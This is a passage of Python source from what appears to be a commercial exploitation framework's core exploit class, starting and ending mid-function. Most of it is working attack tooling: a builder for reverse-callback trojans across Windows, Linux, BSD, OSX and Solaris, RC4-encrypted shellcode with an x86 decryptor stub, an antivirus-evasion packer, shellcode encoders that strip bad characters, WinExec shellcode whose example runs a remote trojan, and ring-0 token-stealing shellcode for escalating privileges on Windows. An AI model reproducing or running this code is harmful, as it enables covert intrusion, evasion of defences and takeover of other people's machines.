                fname = utils.get_resources_path(PACKED_WIN32_TEMPLATE)
            else:
                fname = utils.get_resources_path(PACKED_WIN64_TEMPLATE)

            f = open(fname, 'rb+')
            original_binary = f.read()
            f.close()
        except Exception as e:
            return False, None

        # last, key, compressed, slen, off_compressed_len must be found
        off_last = find_offset(original_binary, struct.pack('<L', 0xf10ff30f))
        off_key = find_offset(original_binary, "ABCDDCBADCBAABCD")
        off_keylen = find_offset(original_binary, struct.pack('<L', 0xf40ff30f))
        off_compressed = find_offset(original_binary, 'U'*5000)
        off_slen = find_offset(original_binary, struct.pack('<L', 0xf20ff30f))
        off_compressed_len = find_offset(original_binary, struct.pack('<L', 0xf30ff30f))

        if  not off_last \
            or not off_key \
            or not off_keylen \
            or not off_compressed \
            or not off_slen \
            or not off_compressed_len:
            return False, None

        key = generate_encryption_key()
        dummy = generate_dummy()

        encrypted_mosdefpayload = string_encryption(mosdefpayload, key)
        compressed_binary = zlib.compress(dummy+encrypted_mosdefpayload)

        # last, key, compressed, slen, off_compressed_len must be patched
        bin1 = patch_binary_at_offset(original_binary, off_last, struct.pack('<L', ord(encrypted_mosdefpayload[-1])))
        bin2 = patch_binary_at_offset(bin1, off_key, key)
        bin3 = patch_binary_at_offset(bin2, off_compressed, compressed_binary)
        bin4 = patch_binary_at_offset(bin3, off_slen, struct.pack('<L', len(mosdefpayload)))
        bin5 = patch_binary_at_offset(bin4, off_compressed_len, struct.pack('<L', len(compressed_binary)))
        bin6 = patch_binary_at_offset(bin5, off_keylen, struct.pack('<L', len(key)))
        return True, bin6

    def buildmosdeftrojan(self, ipaddr, port, target_os=None, http=False, ssl=False, universal=False, encrypted=False, av_bypass=False, dll=False, win8_compatible=False, dll_return=True, dll_create_thread=True):
        """
        Uses MOSDEF to build a trojan based on self.target_os.base_os
        """
        from MOSDEF import makeexe
        from MOSDEF.cc import threadsafe_cc_main
        import socket

        # keep these uppercase ...
        os_cpu_combo = ["WINDOWS X86",
                        "WINDOWS X64",
                        "LINUX X86",
                        "LINUX X64",
                        "LINUX PPC",
                        "LINUX ARM",
                        "SOLARIS SPARC",
                        "SOLARIS X86",
                        "BSD X86",
                        "OSX X86",
                        "OSX X64"]

        ##Quick check to see if the CPU/OS combo is one we actually support
        os_check = ' '.join([str(target_os.base), str(target_os.arch)]).strip()
        if os_check in ["Windows", "Linux"]:
            # default is X64
            os_check += " X64"

        if os_check.upper() not in os_cpu_combo:
            self.log("Selected CPU / OS combo of '%s' is not currently supported by buildmosdeftrojan " % (os_check))
            return False

        if target_os == None:
            target_os = self.target_os

        self.log('target os: %s' % target_os.base)
        if target_os.isUnix() and not target_os.cygwin:
            self.log("Compiling Unix trojan")
            #TODO, account for CANVAS ROOT
            if universal:
                infilename = "backdoors/cback_mmap_universal_rwx.c"
            else:
                infilename ="backdoors/cback_mmap_rwx.c"

            #we initialize our compiler with an empty define set
            vars = {}
            #-D CBACK_PORT=port, etc
            vars['CBACK_PORT'] = port
            vars['CBACK_ADDR'] = str2int32(socket.inet_aton(ipaddr))

            self.log("Callback address is %x:%d" % (vars['CBACK_ADDR'], vars['CBACK_PORT']))
            cc_command = []

            # handle OS compile semantics here ..
            self.log("Target for build mosdef callback: %s" % target_os.base.upper())
            if 'LINUX' in target_os.base.upper():
                cc_command += ['-k', '2.6'] # assume 2.6 for Linux ..

                if universal:
                    if 'X86' in target_os.arch.upper():
                        mosdef_type = self.engine.getMosdefType(canvasengine.LINUXMOSDEF_INTEL)
                    elif 'X64' in target_os.arch.upper():
                        mosdef_type = self.engine.getMosdefType(canvasengine.LINUXMOSDEF_X64)
                    elif 'ARM' in target_os.arch.upper():
                        mosdef_type = self.engine.getMosdefType(canvasengine.LINUXMOSDEF_ARM9)

                if 'X64' in target_os.arch.upper(): cc_command += ['-D', '__AMD64__']

            elif 'BSD' in target_os.base.upper():
                self.log("Assuming version 5.2 for BSD")
                cc_command += ['-k', '5.2']
                if universal:
                    mosdef_type = self.engine.getMosdefType(canvasengine.FREEBSDMOSDEF_INTEL)

            elif 'OSX' in target_os.base.upper():
                cc_command += ['-D', '__OSX__']
                cc_command += ['-k', '10.5'] # assume 10.5 for MacOS

                if 'X86' in target_os.arch.upper():
                    cc_command += ['-D', '__OSX_X86__']
                    if universal:
                        mosdef_type = self.engine.getMosdefType(canvasengine.OSXMOSDEF_INTEL)
                elif 'X64' in target_os.arch.upper():
                    cc_command += ['-D', '__OSX_X64__']
                    if universal:
                        mosdef_type = self.engine.getMosdefType(canvasengine.OSXMOSDEF_X64)

            else:
                self.log("Assuming version of None for this OS")
                cc_command += ['-k', 'None'] # might fail .. no kernel version set

            # solaris intel needs a syscalltype send before the fd send emulation
            if 'SOLARIS' in target_os.base.upper():
                cc_command += ['-k', 'None']

                if 'X86' in target_os.arch.upper():
                    cc_command += ['-D', '__SOLARIS_INTEL__']
                    if universal:
                        mosdef_type = self.engine.getMosdefType(canvasengine.SOLARISMOSDEF_INTEL)
                elif 'SPARC'  in target_os.arch.upper() and universal:
                    mosdef_type = self.engine.getMosdefType(canvasengine.SOLARISMOSDEF_SPARC)


            if universal:
                mosdef_id = self.engine.getNewMosdefID(self)
                vars["MOSDEF_TYPE"] = mosdef_type
                vars["MOSDEF_ID"]   = mosdef_id

            for var in vars:
                cc_command += ["-D", "%s=%s" % (var, vars[var])]

            # AFAIK this is the only place where we do these commandline calls to cc
            # so instead of mangling the remoteresolver code .. handle versioning semantics _here_
            cc_command += ["-v", "-m", target_os.base, "-p", target_os.arch, infilename]

            logging.info("CC command: %s" % cc_command)
            self.mosdeftrojan = threadsafe_cc_main(cc_command)

            if not self.mosdeftrojan:
                self.log("[EE] Error during callback generation")
                return False
            self.log("[ii] Length of CC compiled trojan: %s" % len(self.mosdeftrojan))

        elif target_os.base.upper() in ['WINDOWS']:
            # WIN64
            if 'X64' in target_os.arch.upper():
                from shellcode.standalone.windows.payloads64 import payloads
                assembly = None
                shellcode = None
                if dll:
                    plds = payloads(module=self, use_mutex=True, dll_create_thread=dll_create_thread, dll=dll)
                    inner_pld = payloads(dll=False)
                    assembly_inner = None
                    if http == False:
                        assembly_inner = inner_pld.callback(host=ipaddr, port=port, universal=universal)
                    else:
                        assembly_inner = inner_pld.http_proxy(ipaddr, port, SSL=ssl)

                    code_inner = inner_pld.assemble(assembly_inner)

                    assembly_outer = plds.wrap_payload(code_inner)
                    shellcode = plds.assemble(assembly_outer)
                else:
                    plds = payloads(module=self, dll=dll)
                    assembly = None
                    if http == False:
                        assembly = plds.callback(host=ipaddr, port=port, universal=universal, exit_process=True)
                    else:
                        assembly = plds.http_proxy(ipaddr, port, SSL=ssl)
                    shellcode = plds.assemble(assembly)

                myPE = pelib.PElib(win64=1)
                self.mosdeftrojan = myPE.createPEFileBuf({'DllMain' : shellcode} if dll else shellcode, gui=True)

                if self.mosdeftrojan == None:
                    self.log("Some sort of error compiling our X64 PE")
                    return False

                self.log("Win64 MOSDEF Trojan compiled to %d bytes" % len(self.mosdeftrojan))

                if av_bypass and not dll:
                    ret, data = self.prepare_obfuscated_pe(self.mosdeftrojan, arch=target_os.arch.upper())
                    if not ret:
                        return False
                    else:
                        self.mosdeftrojan = data
                        self.log("Win64 MOSDEF Trojan packed to %d bytes" % len(self.mosdeftrojan))
                        return True

            #WIN32
            else:
                self.log("Creating Win32 callback trojan")

                if http == False:
                    if dll:
                        from shellcode.standalone.windows.payloads import payloads
                        pld = payloads(dll=True)
                        code = pld.callback(host=ipaddr, port=port, universal=universal)
                        shellcode = pld.assemble(code)
                    else:
                        logging.info("port: %s ip: %s" % (port, ipaddr))
                        sc = shellcodeGenerator.win32()
                        sc.vProtectSelf = True
                        sc.addAttr("findeipnoesp", {"subespval": 0}) #don't mess with eip
                        sc.addAttr("revert_to_self_before_importing_ws2_32", {"win8_compatible": win8_compatible})
                        sc.addAttr("tcpconnect", {"port" : port, "ipaddress" : ipaddr})
                        sc.addAttr("loadFDasreg", {"reg" : "esi"})

                        if universal:
                            mosdef_type=self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
                            mosdef_id=self.engine.getNewMosdefID(self)
                            sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
                            devlog("canvasexploit", "Created a Win32 binary in Universal mode with mosdef_type: %d mosdef_id: %d"%(mosdef_type, mosdef_id))

                        sc.addAttr("RecvExecDepSafe",None) #MOSDEF
                        sc.addAttr("ExitProcess", None)
                        shellcode = sc.get()
                else:
                    from shellcode.standalone.windows.payloads import payloads
                    pld = payloads(dll=dll)
                    code = pld.http_proxy(ipaddr, port, SSL=ssl)
                    shellcode = pld.assemble(code)

                if encrypted:
                    if dll:
                        self.log('Encrypted payloads inside DLL files are not supported, aborting..')
                        return False

                    from Crypto.Cipher import ARC4

                    #Random 64bits key
                    rc4key=''
                    for x in range(0,8):
                        rc4key += struct.pack("B", random.randint(0,0xff))

                    self.log("Adding RC4 encryption using key: %s" % hexprint(rc4key))
                    encrypted_payload = ARC4.new(rc4key).encrypt(shellcode)

                    # add VirtualProtect stub to make our decoder able to run
                    import shellcode.standalone.windows.payloads as payloads

                    codegen = payloads.basecode(VirtualProtect = True)
                    codegen.find_function('kernel32.dll!loadlibrarya')
                    codegen.find_function('kernel32.dll!VirtualAlloc')

                    codegen._globals.addString('KEY', rc4key)
                    codegen._globals.addDword('BUFFER_LEN', len(encrypted_payload))
                    codegen._globals.addDword('RC4STATE')
                    codegen._globals.addDword('CRYPTED_PAYLOAD_OFFSET')

                    codegen.main += """
                    jmp geteip
                    callme:
                        popl %edi
                        jmp start
                    geteip:
                        call callme

                    start:
                        leal end-start(%edi),%edi
                        movl %edi,CRYPTED_PAYLOAD_OFFSET-getpcloc(%ebp)

                        // Initialize RC4 S-Box on stack
                        xorl %eax, %eax
                        movl  $0x102, %ecx
                        subl  %ecx, %esp
                        movl %esp, %edi
                        rep stosb
                        movl %esp,RC4STATE-getpcloc(%ebp)

                        xorl %ecx, %ecx
                        fill_array:
                            cmpw $0x100, %ecx
                            jge randomize_permutation

                            movl RC4STATE-getpcloc(%ebp),%edi
                            add %ecx, %edi
                            movb %cl, (%edi)
                            inc %ecx
                        jmp fill_array

                        randomize_permutation:
                                leal KEY-getpcloc(%ebp),%edi
                                movl RC4STATE-getpcloc(%ebp),%esi

                                xorl %edx, %edx
                                xorl %eax, %eax
                                pushl %eax

                        loop_here:
                                movl %eax,%ecx
                                andl $0x80000007, %ecx
                                jns go
                                decl %ecx
                                or $0xFFFFFF8, %ecx
                                incl %ecx

                        go:
                                movb (%ecx,%edi), %cl  // edi = key
                                addb (%eax,%esi), %cl  // esi = permutation table
                                addb  %cl, %dl
                                movzbl %dl,%ecx
                                addl %esi, %ecx

                                // swap bytes
                                movzbl (%eax,%esi), %ebx
                                movb %bl, -8(%esp)          //update state
                                movzbl (%ecx),%ebx
                                movb %bl, (%eax,%esi)
                                movzwl -8(%esp),%ebx

                                inc %eax
                                dec %eax
                                nop
                                inc %eax
                                cmpw $0x100, %eax
                                mov %bl, (%ecx)
                                jl loop_here

                            // Decrypt/encrypt using state buffer

                            movl RC4STATE-getpcloc(%ebp),%ecx
                            movl %ecx,%eax
                            addl $0x104,%ecx
                            movl %ecx,%edi
                            movb 0x100(%eax), %cl

                            movl BUFFER_LEN-getpcloc(%ebp), %edi
                            movl %edi, -4(%esp)
                            movl CRYPTED_PAYLOAD_OFFSET-getpcloc(%ebp),%edi    // output buffer
                            movl CRYPTED_PAYLOAD_OFFSET-getpcloc(%ebp),%edx    // input buffer

                            loopea:
                                inc %cl
                                movb %cl, 0x100(%eax)
                                movzbl %cl, %ecx
                                lea (%ecx,%eax),%esi
                                movb (%esi),%cl
                                addb %cl,0x101(%eax)
                                movzbl 0x101(%eax),%ecx
                                movb (%esi),%dl
                                add %eax,%ecx

                                movb (%ecx),%bl
                                mov  %bl, (%esi)
                                movb %dl,(%ecx)

                                movzbl 0x101(%eax), %edx
                                movb 0x100(%eax),%cl
                                movb (%edx,%eax), %dl
                                movzbl %cl,%esi
                                addb (%esi,%eax), %dl

                                movzbl %dl, %edx
                                movb (%edx,%eax),%dl
                                xorb (%edi), %dl

                                movb %dl, (%edi)
                                incl %edi
                                decl -4(%esp)
                                jnz loopea

                        addl $0x106, %esp
                        end:
                    """

                    rc4_decrypt = mosdef.assemble(codegen.get(), "X86")
                    shellcode = rc4_decrypt + encrypted_payload

                myPElib = pelib.PElib()
                self.log("Length of shellcode for mosdef trojan: %s" % len(shellcode))

                # shuffle the imports
                importante = myPElib.get_random_imports()

                self.mosdeftrojan = myPElib.createPEFileBuf({'DllMain' : shellcode} if dll else shellcode, gui=True,importante=importante)

                if self.mosdeftrojan == None:
                    self.log("Some sort of error compiling our PE")
                    return False

                self.log("Win32 MOSDEF Trojan compiled to %d bytes" % len(self.mosdeftrojan))
                if av_bypass and not dll:
                    ret, data = self.prepare_obfuscated_pe(self.mosdeftrojan)
                    if not ret:
                        return False
                    else:
                        self.mosdeftrojan = data
                        self.log("Win32 MOSDEF Trojan packed to %d bytes" % len(self.mosdeftrojan))
                        return True

        else:
            self.log("Could not create trojan for %s"%str(target_os))
            return False
        return True

    def intel_encode(self, badstring, rawshellcode, subesp=0, minimumchunklength=80):
        """
        Encodes the shellcode with the badstring
        tries xor and additive and chunked additive encoder
        """
        if len(rawshellcode)==0:
            self.log("Your shellcode is of length zero. This is most likely a bug in your exploit!")
            return ""

        self.log("Intel Encoding raw shellcode of length %d"%len(rawshellcode))
        if len(badstring) == 0:
            self.log("Encoding not needed")
            return rawshellcode
        #here we check to see if we are LIKELY to find a
        #good XOR encoder - otherwise we will waste a lot
        #of time doing nothing useful
        if (len(badstring)*len(rawshellcode))<3000:
            self.log("Trying xor encoder")
            enc=xorencoder.simpleXOR()
            enc.subesp=subesp
            enc.setbadstring(badstring)
            ret=enc.find_key(rawshellcode)
            if ret==0:
                self.log("Could not generate XOR key for this shellcode!")
            else:
                encodedshellcode=enc.encode(rawshellcode)
                if encodedshellcode:
                    return encodedshellcode
        if (len(badstring)*len(rawshellcode))<5000:
            self.log("Trying additive encoder")
            #Then try intel additive encoder
            encoder=addencoder.inteladdencoder()
            encoder.maxguesses=5000
            encoder.setbadstring(badstring)
            encodedshellcode=encoder.encode(rawshellcode)

            if encodedshellcode:
                self.log("Used additive encoder")
                return encodedshellcode

        #otherwise we always try chunked encoder
        self.log("Using chunked encoder (minimum chunk of %d)"%minimumchunklength)
        encoder=chunkedaddencoder.intelchunkedaddencoder()
        if len(badstring)>5:
            #130 is very slow, 80 is quite fast
            #but 80 will generate very large shellcode!
            encoder.minimumchunklength=minimumchunklength
        encoder.setbadstring(badstring)
        shellcode = encoder.encode(rawshellcode)
        if shellcode:
            self.log("Used chunked additive encoder")
            return shellcode
        self.log("Chunked additive encoder failed")
        return None

    def createSmallWin32Shellcode(self,host,port,subesp=0, badstring=None):
        self.log("createSmallWin32Shellcode: %s:%s subesp: %d"%(host,port,subesp))
        sc=shellcodeGenerator.win32()
        sc.addAttr("tcpconnect",{"port":port,"ipaddress":host})
        sc.addAttr("SmallRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        sc.addAttr("UseWS2Ordinal",None)
        rawshellcode=sc.get()
        self.log("Length of raw shellcode=%d"%len(rawshellcode))
        if badstring==None:
            badstring=self.badstring
        if not badstring:
            self.shellcode=rawshellcode
            return rawshellcode

        self.shellcode=self.intel_encode(badstring, rawshellcode)
        if not self.shellcode:
            self.log("Warning: No shellcode generated - too many bad characters?!")

        return self.shellcode

    def createAlphaSmallWin32Shellcode(self, host, port, subesp=0):
        self.log("createAlphaSmallWin32Shellcode: %s:%s subesp : %d" % (host, port, subesp))
        sc = shellcodeGenerator.win32()
        sc.addAttr('tcpconnect', {'port' : port, 'ipaddress' : host})
        sc.addAttr('SmallRecvExecWin32', {'socketreg' : 'FDSPOT'})
        sc.addAttr('UseWS2Ordinal', None)
        sc = sc.get()
        self.log("[+] pre alphanumeric encoding shellcode length: %d" % len(sc))
        encoder         = alphanumeric.AlphaNum()
        totopc          = encoder.seh_pc()
        getpc           = encoder.get_pc(reg='ecx')
        payload         = encoder.encode(sc)
        self.shellcode  = totopc + getpc + payload
        self.log("[+] post alphanumeric encoding shellcode length: %d" % len(sc))
        self.log("[+] Encoded payload to: %s" % self.shellcode)
        return self.shellcode

    def getfirstnode(self):
        return self.argsDict["passednodes"][0]

    def osdetect(self):
        "we do this so often, it needs a function"
        osd=self.engine.getModuleExploit("osdetect")
        osd.link(self)
        osd.run()
        return osd.result

    def exploitnodes(self,modulename,nodes=None,args=None,target=None):
        """Run one module over all our nodes and return a list of results
        args is a dictionary of arguments, when used
        """
        sploit=self.engine.getModuleExploit(modulename)
        sploit.link(self)
        if target:
            sploit.target=target
        if args:
            for arg in args:
                sploit.argsDict[arg]=args[arg]

        results=[]
        if nodes:
            allnodes=nodes
        else:
            allnodes=self.argsDict["passednodes"]
        for node in allnodes:
            sploit.argsDict["passednodes"]=[node]
            ret=sploit.run()
            result=sploit.result
            results.append(result)
        return results

    def createTestShellcode(self,start=0x00,end=0x100,reverse=False):
        """
        Creates a short shellcode with no known bad chars in it
        When reverse is true then we do it backwards - useful
        for testing if iscntrl is the filter.
        """
        self.log("Creating test shellcode: %s:%s %s"%(start,end,reverse))
        self.log("Badstring: %s"%prettyhexprint(self.badstring))

        ret=""
        if not reverse:
            for i in range(start,end):
                if chr(i) not in self.badstring:
                    ret+="A"+chr(i)+"%2.2x"%i
        else:
            #reverse
            if end==256:
                end=255
            for i in range(end,start,-1):
                if chr(i) not in self.badstring:
                    ret+="A"+chr(i)+"%2.2x"%i
        self.shellcode=ret
        return ret

    def encodeshellcode(self,rawshellcode,platform="X86"):
        if platform=="X86":
            encoder=chunkedaddencoder.intelchunkedaddencoder()
        else:
            self.log("encodeshellcode: Unknown platform %s"%platform)
            return
        #these are the characters not allowed by the exploit
        encoder.setbadstring(self.badstring)

        self.log( "Encoding shellcode. This may take a while if we don't find a good value in the cache.")
        shellcode=encoder.encode(rawshellcode)
        self.log( "Done encoding shellcode.")
        if shellcode=="":
            self.log( "Could not encode shellcode")
            return 0
        #debug int
        #shellcode="\xcc"+shellcode
        self.shellcode=shellcode
        return self.shellcode

    def createWin32WinExecShellcode(self,command,reverttoself=0):
        """
        Creates a shellcode that executes one command
        Note that this shellcode does not wrap it in a cmd /c
        so if you want to execute multiple commands, you'll have
        to do that manually (command="cmd /c blah")

        Setting the revertoself argument will make bigger shellcode,
        but it will also let winexec work in cases where you came
        in over MSRPC and your token is now anonymous. The anonymous
        token can't load DLL's, which may result in some issues for you.

        Final shellcode will probably result in around 350 bytes,
        which is nice and small, but obviously you'll need to add to that
        the length of your command.

        Examples:
        self.createWin32WinExecShellcode("\\\\myhost\\mytrojan.exe")

        """
        if not command:
            self.log("Cannot create null winexec shellcode")
            return
        sc = shellcodeGenerator.win32()
        #sc.addAttr("ForkLoad", None)
        # the to fork code
        sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
        if reverttoself:
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
        sc.addAttr("winexec", {"command" : command })
        rawshellcode = sc.get()
        if self.badstring=="":
            #no bad characters? Great!
            self.shellcode=rawshellcode
            return 1
        self.log("Raw shellcode (before encoding) is %d bytes"%len(rawshellcode))
        #set up the shellcode
        #For testing purposes! (following line) Comment out for real use
        #rawshellcode=(badchartest(0,255,self.badstring)*50)[:len(rawshellcode)]
        self.log("Last raw characters: %s"%prettyhexprint(rawshellcode[-16:]))
        self.encodeshellcode(rawshellcode)
        self.log("Encoded shellcode length: %d"%len(self.shellcode))
        self.log("Last encoded characters: %s"%prettyhexprint(self.shellcode[-16:]))
        return 1

    def createWin32ThreadCallbackShellcode(self):
        """
        Creates a Win32 Shellcode that starts a new thread.
        Exploits that use this need:
        self.listenerArgsDict["fromcreatethread"]=1
        in their __init__ for the GUI to set this properly, and
        will need a -i fromcreatethread when using
        the commandline
        """
        if self.callback==None:
            self.log("Cannot create callback shellcode without a callback...")
            return
        host=self.callback.ip
        port=self.callback.port
        self.log("Creating shellcode to callback to %s:%s"%(host,port))
        sc = shellcodeGenerator.win32()
        #sc.addAttr("ForkLoad", None)
        # the to fork code
        sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
        sc.addAttr("revert_to_self_before_importing_ws2_32", None)
        sc.addAttr("tcpconnect", {"port" : port, "ipaddress" : host})
        sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        sc.addAttr("ExitThread",None)
        rawshellcode = sc.get()
        if self.badstring=="":
            #no bad characters? Great!
            self.shellcode=rawshellcode
            return 1
        self.log("Raw shellcode (before encoding) is %d bytes"%len(rawshellcode))
        #set up the shellcode
        #For testing purposes! (following line) Comment out for real use
        #rawshellcode=(badchartest(0,255,self.badstring)*50)[:len(rawshellcode)]
        #self.log("Last raw characters: %s"%prettyhexprint(rawshellcode[-16:]))
        self.shellcode=self.intel_encode(self.badstring, rawshellcode)
        self.log("Encoded shellcode length: %d"%len(self.shellcode))
        #self.log("Last encoded characters: %s"%prettyhexprint(self.shellcode[-16:]))
        #you'll need this in __init__ as well. here for reference
        self.log("If you're using the commandlineInterface.py then you'll need -i fromcreatethread")
        self.listenerArgsDict["fromcreatethread"]=1
        return 1

    def createRing0TokenShellcode(self,pid=-1,retadd=0,osmajor=-1,osminor=-1):
        """Replace the Token of a Process by the one of the System process
           If _pid_ is -1, then the 'current' process Token will be replaced,
           otherwise, the one of the process with the given _pid_ will be.
           _retadd_ adjusts the stack for the 'ret' instruction, it depends
           from where your shellcode is called

           """

        ring0shellcode="""
    xorl %eax,%eax
    movl %fs:0x124(%eax),%eax
    movl 0xProcessOffset(%eax),%eax
    movl %eax,%ecx
find_system_process:
    movl 0xActiveProcessLinksOffset(%eax),%eax
    subl $0xActiveProcessLinksOffset,%eax
    cmpl $0xSystemProcessId,0xUniqueProcessIdOffset(%eax)
    jnz find_system_process
    movl 0xTokenOffset(%eax),%edx //Token of System process
    movl %ecx,%eax
"""
        if pid!=-1:
            ring0shellcode+="""find_our_process:
    movl 0xActiveProcessLinksOffset(%eax),%eax
    subl $0xActiveProcessLinksOffset,%eax
    cmpl $0xOurProcessId,0xUniqueProcessIdOffset(%eax)
    jnz find_our_process
"""
        ring0shellcode+='    movl %edx,0xTokenOffset(%eax) //Replace the Token of our process\n'
        ring0shellcode+="""popl %edx
        popl %ecx
        movl $0x00000001, %eax
        movl %ebp, %esp
        pop  %ebp
        """
        if retadd==0:
            ring0shellcode+='    ret\n'
        else:
            ring0shellcode+='    ret $0x%x\n'%(retadd)
        self.log('Creating RING0 Token stealing shellcode for ProcessId %d'%(pid))

        if osmajor==6:
            self.log('Windows Vista/2008 RING0...')
            parameters={}
            parameters['ProcessOffset']=0x48 #nt!_KTHREAD.ApcState.Process
            parameters['ActiveProcessLinksOffset']=0xa0 #nt!_EPROCESS.ActiveProcessLinks
            parameters['UniqueProcessIdOffset']=0x9c #nt!_EPROCESS.UniqueProcessId
            parameters['TokenOffset']=0xe0 #nt!_EPROCESS.Token
            parameters['OurProcessId']=pid
            parameters['SystemProcessId']=0x04
        elif osmajor==5 and osminor==2:
            self.log('Windows Server 2003(R2) SP2 RING0...')
            parameters={}
            parameters['ProcessOffset']=0x38 #nt!_KTHREAD.ApcState.Process
            parameters['ActiveProcessLinksOffset']=0x98 #nt!_EPROCESS.ActiveProcessLinks
            parameters['UniqueProcessIdOffset']=0x94 #nt!_EPROCESS.UniqueProcessId
            parameters['TokenOffset']=0xd8 #nt!_EPROCESS.Token
            parameters['OurProcessId']=pid
            parameters['SystemProcessId']=0x04
        elif osmajor==5 and osminor==1:
            self.log('Windows XP RING0...')
            parameters={}
            parameters['ProcessOffset']=0x44 #nt!_KTHREAD.ApcState.Process
            parameters['ActiveProcessLinksOffset']=0x88 #nt!_EPROCESS.ActiveProcessLinks
            parameters['UniqueProcessIdOffset']=0x84 #nt!_EPROCESS.UniqueProcessId
            parameters['TokenOffset']=0xc8 #nt!_EPROCESS.Token
            parameters['OurProcessId']=pid
            parameters['SystemProcessId']=0x04
        else:
            self.log('Invalid OS version')
            return 0

        for k in parameters.keys():
            ring0shellcode=ring0shellcode.replace(k,'%x'%(parameters[k]))

        self.shellcode=mosdef.assemble(ring0shellcode,'x86')

        return 1

    def pidfromname(self,name,node):
        """
        Uses PS to get a pid from a name on a certain node
        returns -1 on failure

        If pid is already a string representation of an integer, we return that instead
        of course, this means you cannot get the "pid" of a process named "1234"

        """
        try:
            pid=dInt(name)
        except:
            pid=-1

        if pid!=-1:
            return pid

        #print "Matching with %s"%name
        if "win32api" in node.capabilities:
            # self.log("Getting ps listing")
            mod=self.engine.getModuleExploit("ps")
            mod.link(self,nodes=[node])
            mod.run()
            pslist=mod.result[0]
            for p in pslist:
                #print "looking at %d %s"%(p["pid"],p["exe"])
                if p["exe"].upper()==name.upper():
                    pid=p["pid"]
                    self.log("[+] Found PID (%d) for (%s)" % (pid, name))
                    break
        return pid

    def namefrompid(self, pid, node):
        """
        Does the opposite to the above, given a pid get the name of it's process
        """
        name=""
        #print "Matching with %s"%name
        if "win32api" in node.capabilities:
            self.log("Getting ps listing")
            mod=self.engine.getModuleExploit("ps")
            mod.link(self,nodes=[node])
            mod.run()
            pslist=mod.result[0]
            for p in pslist:
                if p["pid"]==pid:
                    name=p["exe"]
                    break
        return name

    def output(self, ip="", subdir=""):
        """
        Rich: new general method to place data we want to save to disk
        (screenshots/ram dumps etc) into the directory determined by
        canvas_output_dir in canvas.conf and to put it there with the correct
        directory structuring

        Response to Dave Bug: dir creation now falls back to creating output in
                              the current working dir if for some reason the
                              CANVAS_REPORT_DIR fails :)
        """
        return self.engine.create_new_session_output_dir(ip, subdir)

    def log_debug(self, message, terminal_only=False):
        self.nlog(message, terminal_only, level="debug")

    def log_info(self, message, terminal_only=False):
        self.nlog(message, terminal_only, level="info")

    def log_error(self, message, terminal_only=False):
        self.nlog(message, terminal_only, level="err")

    def nlog(self, message, terminal_only=False, level="op"):
        #
        # Old logging mechanism, deprecated
        #
        """
        text = "["
        if level == "op":
            text += "+"
        elif level == "debug":
            text += "dd"
        elif level == "info":
            text += "ii"
        elif level == "err":
            text += "EE"

        text += "] " + message

        if terminal_only:
            print(text)
        else:
            hostlistener.log(self, text)

        self.loggedInformation += [text]
        return
        """

        if level   == "op" or level == "info":
            logging.info(message)
        elif level == "debug":
            logging.debug(message)
        elif level == "err":
            logging.error(message)
        else:
            # Default to logging.info() just in case
            logging.info(message)

    def log(self, message, host=None, terminal_only=False):
        #
        # Old logging mechanism, deprecated
        #
        """
        if self.target:
            if not host:
                host = self.target.interface

            if CanvasConfig["session_logging"]:
                self.engine.current_logging_host = host

            if hasattr(self, "netmask"):
                if host:
                    host = host + "/%s" % self.netmask
                else:
                    host = "/%s" % self.netmask

            message = "(%s) %s" % (host, message)

        if terminal_only:
            print(message)
        else:
            hostlistener.log(self,message)

        self.loggedInformation += [message]
        return
        """

        #
        # New logging mechanism, we default to info as there is not much else
        # we can do from this point
        #
        # Hypothetically we could parse the message for tokens ("-", "+") at the
        # beginning, and translate the level accordingly. We need to understand
        # how much of this is true on the code base
        #
        m = logging.info
        if isinstance(message, str):
            if ("[-]" or "[EE]") in message:
                m = logging.error
            elif "[!]" in message:
                m = logging.warning

            message = message.replace("[-] ", "").replace("[!] ", "").replace("[+] ", "").replace("[ii] ", "").replace("[EE] ", "")

        m(message)

    def check_crashed(self):
        """
        Override this to check the crashed status of your target. Typically this means
        rerun the test() function and maybe try to connect to the host as well

        """
        #A default way to check crashed services
        self.crashed_status=self.CRASHED_UNKNOWN
        if self.covertness > 4:
            self.log("Covertness level %d - not checking crashed status"%self.covertness)
            return self.crashed_status
        try:
            ret=self.test()
        except:
            ret=0
        if ret:
            self.log("Service still appears to respond to our test - did not crash")
            self.crashed_status=self.CRASHED_STILLALIVE
        else:
            self.log("Test failed - either service crashed or host crashed...")
            if hasattr(self,"myDCE"):
                self.log("We are a MSRPC exploit")
                self.log("Waiting 60 seconds to test in case we crashed an important service that causes the box to reboot")
                time.sleep(60)
                if self.state==self.HALT:
                    self.crashed_status=self.CRASHED_SERVICE
                    self.log("Halted - not testing for crashed box...assuming service died")
                    return 0
            if self.host:
                if self.checkAlive(self.host):
                    self.crashed_status=self.CRASHED_SERVICE
                    self.log("Crashed the service - the host did respond.")
                else:
                    self.log("The host did not respond - it may be rebooting.")
                    self.crashed_status=self.CRASHED_HOST
        #return our crashed status...
        return self.crashed_status

##OLD BAD LOGIC
    #def can_scanrand(self, iface1=None):

        #if self.node.nodetype!="LocalNode":
            #self.log("Cannot do a scanrand-style scan from a remote node.")
            ##can't do scanrand from remote nodes
            #return 0

        #if not iface1:
            #interfaces = self.node.interfaces.all_interfaces()
            #for interface in interfaces:
                #if interface != "lo":
                    #iface = interface
                    #break

        #mysender = sender(iface=iface1)

        ## The iface on the sender should be checked
        #if mysender.iface is not None:
            #return 1
        #else:
            #return 0

    def can_scanrand(self, iface = None, target = None):
        """
        NO MORE DEFAULT TO ETH0 as that is just plain SILLY
        Specify a interface or an IP to see if we can get a raw
        interface
        """
        if self.node.nodetype != "LocalNode":
            self.log("Cannot do a scanrand-style scan from a remote node.")
            return 0

        if not iface and not target:
            self.log( "Need to specify an IP of an Interface")
            print "XXX: Need to specify an IP of an Interface or an Interface Explicitly"
            return 0

        if iface==None and target!=None:
            devlog("sniffer", "Sender() Getting interface for target %s"%target)
            iface=get_iface_from_target(target)
            if not iface:
                self.log("Unable to determine interface for the given IP")
                return 0

        try:
            mysender=sender(iface=iface)
        except:
            self.log("Failed to open a raw socket...")
            return 0

        if mysender.iface == None:
